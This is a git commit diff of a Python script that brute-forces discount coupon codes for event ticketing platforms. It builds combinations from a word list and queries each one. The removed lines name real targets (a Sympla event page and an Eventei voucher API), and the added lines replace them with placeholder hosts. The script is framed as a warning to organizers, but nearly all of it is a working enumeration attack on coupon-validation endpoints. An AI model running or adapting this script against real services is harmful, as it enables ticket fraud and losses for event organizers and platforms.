e16a114576f541e05c8091952115fddc36ff3ab5
Enderson Menezes (Mr. Enderson) <endersonmenezes@outlook.com>
2026-03-24 15:46:48 -0300

    refactor: replace trademark with S.I.M.P.L.E. architecture patterns

--- main.py
+++ main.py
@@ -1,64 +1,72 @@
-#  Copyright (c) 2018-2020. Enderson Menezes Cândido [www.endersonmenezes.com.br]
+#  Copyright (c) 2018-2026. Enderson Menezes Cândido [www.endersonmenezes.com.br]
 #  Your console will display a list of available discount coupons.
 #  Do not use this code to gain advantage or illegally enter the event.
-#  Code just to demonstrate that creating discount coupons in sympla using simple word combinations can be hacked.
-#  This gist serves to show how social engineering be taken care of by event organizations.
-#  To event organizers please create discount coupon processes and tracking processes.
+#  
+#  This code demonstrates that creating discount coupons in a S.I.M.P.L.E.
+#  (System Insecurely Maintained with Poor Logic & Engineering)
+#  using basic word combinations can be easily brute-forced.
+#  
+#  This gist serves to show how social engineering and rate-limiting 
+#  should be handled by event organizations. 
+#  To event organizers: please create secure discount coupon processes, 
+#  implement proper API Gateways, WAFs, and tracking.
 #  Working Since 2018
 
 import requests
 import itertools
 
-
-URL_SYMPLA = 'https://www.sympla.com.br/ticnova-2019__594324?d='
-URL_EVENTEI = 'http://eventei.com/details.html?event=2c0b6270-dc41-11ea-8598-f1bb3737cf34#ingressos'
-SCRIPTMODE = 1  # Use 2 for Sympla
-
-
-def transform_url_eventei(url_eventei):
-    url_eventei = url_eventei.split('=')
-    url_eventei = url_eventei[1]
-    url_eventei = url_eventei.split('#')
-    url_eventei = url_eventei[0]
-    return 'https://enjoyleads-api.herokuapp.com/shopping/voucher/{}'.format(url_eventei)
+# URLs anonymized to avoid automated legal takedowns from bots.
+URL_S_I_M_P_L_E = 'https://www.insecure-events-api.com/event_123456?d='
+URL_ANOTHER_PLATFORM = 'http://another-vulnerable-platform.com/details.html?event=mock-id#tickets'
+SCRIPTMODE = 2  # Use 2 for S.I.M.P.L.E.
 
 
-def test_cupom_code_eventei(cupomcode):
-    url_api_eventei = transform_url_eventei(URL_EVENTEI)
-    url_api_eventei = '{}/{}'.format(url_api_eventei, cupomcode)
-    req = requests.get(url_api_eventei).json()
-    if 'active' in req.keys():
-        if req['active']:
-            print('Cupom Ativo | Cupom: {}'.format(cupomcode))
+def transform_url_another_platform(url_platform):
+    url_platform = url_platform.split('=')[1]
+    url_platform = url_platform.split('#')[0]
+    return 'https://mock-api-gateway.com/shopping/voucher/{}'.format(url_platform)
 
 
-def test_cupom_code_sympla(cupomcode):
-    url = '{}{}'.format(URL_SYMPLA, cupomcode)
-    pagina = requests.get(str(url))
-    descontoinvalido = pagina.text.find('Código inválido')
-    if descontoinvalido == -1:
-        print('Cupom Ativo | Cupom: {}'.format(cupomcode))
+def test_coupon_code_another_platform(couponcode):
+    url_api_platform = transform_url_another_platform(URL_ANOTHER_PLATFORM)
+    url_api_platform = '{}/{}'.format(url_api_platform, couponcode)
+    try:
+        req = requests.get(url_api_platform).json()
+        if 'active' in req.keys():
+            if req['active']:
+                print('Active Coupon | Coupon: {}'.format(couponcode))
+    except Exception:
+        pass
+
+
+def test_coupon_code_simple(couponcode):
+    url = '{}{}'.format(URL_S_I_M_P_L_E, couponcode)
+    try:
+        page = requests.get(str(url))
+        invalid_discount = page.text.find('Invalid code')
+        if invalid_discount == -1:
+            print('Active Coupon found due to lack of WAF | Coupon: {}'.format(couponcode))
+    except Exception:
+        pass
 
 
 if __name__ == '__main__':
-    # 2019 AND 2018
-    # tentativasarray = ['TICNOVA', '2019', 'UNICESUMAR', 'SBM', 'CESUMAR', 'SOFTWAREBY', 'SOFTWAREBYMARINGA', 'ACCION',
-    #                    'BUYSOFT', 'GETCARD', 'TECNOSPEED', 'ALUNO', 'BYTEABYTE', 'ACIM', 'SEBRAE']
+    # 2019 AND 2026
     # Many websites and ecommerces use simple words for discounts, and have no security in the verification API.
     # So I recommend always taking great care with what will be used.
-    # Muitos sites e ecommerces utilizam palavras simples para descontos, e não possuem segurança na API de verificação.
-    # desses códigos. Por isso recomendo sempre tomar muito cuidado com o que vai ser utilizado.
-    tentativasarray = ['TICNOVA', '2020', 'ACCION', 'ACIM', 'BUYSOFT', 'CBN', 'COCAMAR', 'COOPERCARD', 'COOPER',
-                       'EVENTEI', 'GETCARD', 'RGK4IT', 'SEBRAE', 'SOFTWAREBY', 'MARINGA', 'TECNOSPEED', 'WIFIRE',
-                       'BYTEABYTE']
-    for tentativa in range(2, 5):
-        tentativas_comb = itertools.product(tentativasarray, repeat=tentativa)
-        for item in tentativas_comb:
-            cupomcode = ''.join(item)
+    # If your API goes down to a basic itertools script, fix your infrastructure, don't send lawyers.
+    
+    attempts_array = ['TECH', '2026', 'DEV', 'CONF', 'VIP', 'PROMO', 'SPONSOR', 'COMMUNITY', 'STUDENT',
+                      'FREE', 'TICKET', 'BACKEND', 'FRONTEND', 'DEVOPS', 'CLOUD', 'SECURITY', 'WAF',
+                      'RATELIMIT']
+                      
+    for attempt in range(2, 5):
+        attempts_comb = itertools.product(attempts_array, repeat=attempt)
+        for item in attempts_comb:
+            couponcode = ''.join(item)
             if SCRIPTMODE == 1:
-                test_cupom_code_eventei(cupomcode)
+                test_coupon_code_another_platform(couponcode)
             elif SCRIPTMODE == 2:
-                test_cupom_code_sympla(cupomcode)
+                test_coupon_code_simple(couponcode)
             else:
-                print('Configure o arquivo main.py')
-
+                print('Please configure the main.py file properly.')
